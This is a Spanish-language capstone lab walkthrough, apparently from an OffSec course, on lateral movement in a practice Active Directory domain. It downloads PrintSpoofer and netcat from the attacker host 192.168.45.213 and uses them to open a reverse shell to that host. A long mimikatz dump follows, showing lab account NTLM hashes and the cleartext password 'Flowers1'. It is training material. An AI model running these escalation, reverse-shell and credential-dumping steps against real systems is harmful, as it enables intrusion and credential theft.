# Walk: Lateral Movement in Active Directory - Capstone - VM Group 4 

## Objetivo
Capstone Exercise: Once VM Group 4 is started, the domain corp.com has been modified. 
Log in as the leon user on CLIENT76 and use the techniques discussed in this Module to 
move laterally and get the flag in the WEB04 shared folder.

## Herramientas
1. tool - 1 
2. tool - 2
## Procedimiento y comandos
#### Paso 1: Conexion RDP
```bash
PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
PS C:\> Get-Service -Name spooler

Status   Name               DisplayName
------   ----               -----------
Stopped  spooler            Print Spooler


PS C:\> cd Users
PS C:\Users> cd leon
PS C:\Users\leon> Start-Service -Name spooler
Start-Service : Service 'Print Spooler (spooler)' cannot be started due to the following error: Cannot start service spooler on computer '.'.
At line:1 char:1
+ Start-Service -Name spooler
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Start-Service], ServiceCommandException
    + FullyQualifiedErrorId : CouldNotStartService,Microsoft.PowerShell.Commands.StartServiceCommand

PS C:\Users\leon> Set-Service -Name spooler -StartupType Automatic
PS C:\Users\leon> Start-Service -Name spooler
```
#### Paso 2: Elevamos privilegios
* En leon
```bash
PS C:\Users\leon> iwr -uri http://192.168.45.213:8000/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
PS C:\Users\leon> iwr -uri http://192.168.45.213:8000/nc.exe -Outfile nc.exe
PS C:\Users\leon> .\PrintSpoofer64.exe -c "C:\Users\leon\nc.exe 192.168.45.213 1234 -e cmd"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```
* Receptor:

```bash
┌──(root㉿kali)-[/home/kali/OffSec/24-ActiveDirectory-LateralMovment]
└─# nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.45.213] from (UNKNOWN) [192.168.142.76] 49884
Microsoft Windows [Version 10.0.16299.1087]
(c) 2017 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

#### Paso 3: Obtenemos hashes:
```powershell
C:\Tools>.\mimikatz.exe
.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 3601121 (00000000:0036f2e1)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:21:35 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 3594159 (00000000:0036d7af)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:21:22 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 3585228 (00000000:0036b4cc)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:20:35 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 3578490 (00000000:00369a7a)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:20:22 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 3569845 (00000000:003678b5)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:19:35 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 3560385 (00000000:003653c1)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:19:22 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 3551382 (00000000:00363096)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:18:35 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 3544634 (00000000:0036163a)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:18:22 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 3536712 (00000000:0035f748)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:17:35 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 3529493 (00000000:0035db15)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:17:22 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 3512372 (00000000:00359834)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:16:35 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 3462025 (00000000:0034d389)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:16:22 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 2876843 (00000000:002be5ab)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:15:35 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 2860655 (00000000:002ba66f)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:15:22 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 2746328 (00000000:0029e7d8)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:14:35 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 2739510 (00000000:0029cd36)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:14:22 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 2731859 (00000000:0029af53)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:13:35 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 2725338 (00000000:002995da)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:13:22 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 2711910 (00000000:00296166)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:12:35 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 2705375 (00000000:002947df)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:12:22 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 1730219 (00000000:001a66ab)
Session           : RemoteInteractive from 2
User Name         : leon
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 10:59:54 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-22101
        msv :
         [00000003] Primary
         * Username : leon
         * Domain   : CORP
         * NTLM     : 840a3c5ddc096e5adae70798ce12919d
         * SHA1     : 8886bbf4ac2fac7fca621bb9435b28a0d9f63914
         * DPAPI    : 81e36d9f9ec14587c4992a0fbe648ff7
        tspkg :
        wdigest :
         * Username : leon
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : leon
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 1730184 (00000000:001a6688)
Session           : RemoteInteractive from 2
User Name         : leon
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 10:59:54 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-22101
        msv :
         [00000003] Primary
         * Username : leon
         * Domain   : CORP
         * NTLM     : 840a3c5ddc096e5adae70798ce12919d
         * SHA1     : 8886bbf4ac2fac7fca621bb9435b28a0d9f63914
         * DPAPI    : 81e36d9f9ec14587c4992a0fbe648ff7
        tspkg :
        wdigest :
         * Username : leon
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : leon
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 1705214 (00000000:001a04fe)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/8/2025 10:59:54 PM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : CLIENT76$
         * Domain   : CORP
         * NTLM     : 89884d4b0c43345607c115d6874238be
         * SHA1     : e95e276c40b12ef0e1a9d697146d7079704089d0
        tspkg :
        wdigest :
         * Username : CLIENT76$
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : CLIENT76$
         * Domain   : corp.com
         * Password : 53 51 d9 f5 ed d7 44 37 86 4a 1d ff c9 a7 e4 30 f5 df 22 ef cc 2a 9a ca f6 ee 47 43 8e d8 31 c0 f7 4c 8e 69 99 07 a9 8f 09 bf f2 1c 3b 0e 31 1e b4 01 77 a8 20 66 a2 8b 93 58 5d 53 57 49 7e de 0a c8 df f9 b4 e8 e3 0c 57 db 8d 27 9f 0e b8 1d bb 45 0f 4a 5b 99 9b e1 f2 db 0a 1d 70 c8 ca 2a 58 17 3b c0 e6 1d 6b 73 0e 81 ae 0e 56 e0 b3 6e 70 24 a9 cc 56 42 f5 ee a0 37 d2 8f e7 bf a8 1a 93 08 98 f0 92 fe 60 44 89 c5 e3 e6 9f 43 9b 45 dd 6f 16 1d c8 cd 51 7d 91 a9 be 21 2c d5 96 e8 cc 40 14 24 7f 29 d4 ce d4 96 52 6b 20 f1 a6 37 36 ee 33 a0 3e 87 62 85 49 62 e3 42 49 2e 6a 69 b2 9d 4f 35 ea d2 f2 d1 dd bf cc 2b 4e 7c c7 2e 18 a6 64 ec 71 ce 5f 9a 00 61 ab 90 43 08 ac 11 7c 7b 2f 73 a1 48 e2 e0 c9 eb ee c1 fe c4 e5 cf 
        ssp :
        credman :

Authentication Id : 0 ; 1705181 (00000000:001a04dd)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/8/2025 10:59:54 PM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : CLIENT76$
         * Domain   : CORP
         * NTLM     : 89884d4b0c43345607c115d6874238be
         * SHA1     : e95e276c40b12ef0e1a9d697146d7079704089d0
        tspkg :
        wdigest :
         * Username : CLIENT76$
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : CLIENT76$
         * Domain   : corp.com
         * Password : 53 51 d9 f5 ed d7 44 37 86 4a 1d ff c9 a7 e4 30 f5 df 22 ef cc 2a 9a ca f6 ee 47 43 8e d8 31 c0 f7 4c 8e 69 99 07 a9 8f 09 bf f2 1c 3b 0e 31 1e b4 01 77 a8 20 66 a2 8b 93 58 5d 53 57 49 7e de 0a c8 df f9 b4 e8 e3 0c 57 db 8d 27 9f 0e b8 1d bb 45 0f 4a 5b 99 9b e1 f2 db 0a 1d 70 c8 ca 2a 58 17 3b c0 e6 1d 6b 73 0e 81 ae 0e 56 e0 b3 6e 70 24 a9 cc 56 42 f5 ee a0 37 d2 8f e7 bf a8 1a 93 08 98 f0 92 fe 60 44 89 c5 e3 e6 9f 43 9b 45 dd 6f 16 1d c8 cd 51 7d 91 a9 be 21 2c d5 96 e8 cc 40 14 24 7f 29 d4 ce d4 96 52 6b 20 f1 a6 37 36 ee 33 a0 3e 87 62 85 49 62 e3 42 49 2e 6a 69 b2 9d 4f 35 ea d2 f2 d1 dd bf cc 2b 4e 7c c7 2e 18 a6 64 ec 71 ce 5f 9a 00 61 ab 90 43 08 ac 11 7c 7b 2f 73 a1 48 e2 e0 c9 eb ee c1 fe c4 e5 cf 
        ssp :
        credman :

Authentication Id : 0 ; 1704591 (00000000:001a028f)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/8/2025 10:59:54 PM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : CLIENT76$
         * Domain   : CORP
         * NTLM     : 89884d4b0c43345607c115d6874238be
         * SHA1     : e95e276c40b12ef0e1a9d697146d7079704089d0
        tspkg :
        wdigest :
         * Username : CLIENT76$
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : CLIENT76$
         * Domain   : corp.com
         * Password : 53 51 d9 f5 ed d7 44 37 86 4a 1d ff c9 a7 e4 30 f5 df 22 ef cc 2a 9a ca f6 ee 47 43 8e d8 31 c0 f7 4c 8e 69 99 07 a9 8f 09 bf f2 1c 3b 0e 31 1e b4 01 77 a8 20 66 a2 8b 93 58 5d 53 57 49 7e de 0a c8 df f9 b4 e8 e3 0c 57 db 8d 27 9f 0e b8 1d bb 45 0f 4a 5b 99 9b e1 f2 db 0a 1d 70 c8 ca 2a 58 17 3b c0 e6 1d 6b 73 0e 81 ae 0e 56 e0 b3 6e 70 24 a9 cc 56 42 f5 ee a0 37 d2 8f e7 bf a8 1a 93 08 98 f0 92 fe 60 44 89 c5 e3 e6 9f 43 9b 45 dd 6f 16 1d c8 cd 51 7d 91 a9 be 21 2c d5 96 e8 cc 40 14 24 7f 29 d4 ce d4 96 52 6b 20 f1 a6 37 36 ee 33 a0 3e 87 62 85 49 62 e3 42 49 2e 6a 69 b2 9d 4f 35 ea d2 f2 d1 dd bf cc 2b 4e 7c c7 2e 18 a6 64 ec 71 ce 5f 9a 00 61 ab 90 43 08 ac 11 7c 7b 2f 73 a1 48 e2 e0 c9 eb ee c1 fe c4 e5 cf 
        ssp :
        credman :

Authentication Id : 0 ; 1666385 (00000000:00196d51)
Session           : Interactive from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 10:59:36 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 1440417 (00000000:0015faa1)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 10:59:22 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 225490 (00000000:000370d2)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 2/26/2025 11:29:17 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : Flowers1
        ssp :
        credman :

Authentication Id : 0 ; 225489 (00000000:000370d1)
Session           : Service from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 2/26/2025 11:29:17 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : Flowers1
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2/26/2025 11:29:01 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 54527 (00000000:0000d4ff)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/26/2025 11:29:01 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : CLIENT76$
         * Domain   : CORP
         * NTLM     : c06a3d3d9dfe4af367e7a2ea975274b7
         * SHA1     : 1f2772b5899c087b3be94dbc2c71091e6a18a761
        tspkg :
        wdigest :
         * Username : CLIENT76$
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : CLIENT76$
         * Domain   : corp.com
         * Password : 1b f7 af 27 df 54 43 43 ce cf 64 5f 29 fe bd eb bc 2e dd 77 5f ac d3 d4 0d 19 26 bb 09 13 ee 82 c9 21 31 33 8b 5d 20 aa f4 8a c7 8a f6 ef 40 8d 28 9f 9b 3c de 36 cf 77 89 03 a2 ba 4f cb 1c 59 a0 6d 48 d5 55 bc 89 a7 5e 34 07 b7 0d f1 99 8b 85 3b f6 7a 72 df 0f 02 aa 73 82 20 5f 88 73 f9 e3 e6 9a 5a c0 3f 1d d5 0e 69 e5 96 bd 3e e0 e2 bb 73 72 29 b8 64 fb 1d 9a fe a0 ab 6f 70 d3 e7 9b 37 85 8d 46 ea 86 b9 72 e8 a2 b8 f8 81 6a 7d 8f f8 41 ae 70 ce cc 68 39 2d 80 02 76 4c 7a 82 44 5b fb a6 6f 6b cd a8 6c 3e 3f 21 74 72 b3 92 e7 bf b0 94 85 b5 ce 51 09 c9 bf 82 33 26 15 39 13 b7 f8 7d 1f dd 6f 56 6a 07 bb 0e 0e 61 42 7f e0 fd 56 dd c3 82 ad 46 78 a6 11 58 89 3d 83 75 6d f0 5e f7 a5 55 e7 b0 d1 5a 93 0f 08 15 b1 5f 
        ssp :
        credman :

Authentication Id : 0 ; 54452 (00000000:0000d4b4)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/26/2025 11:29:01 PM
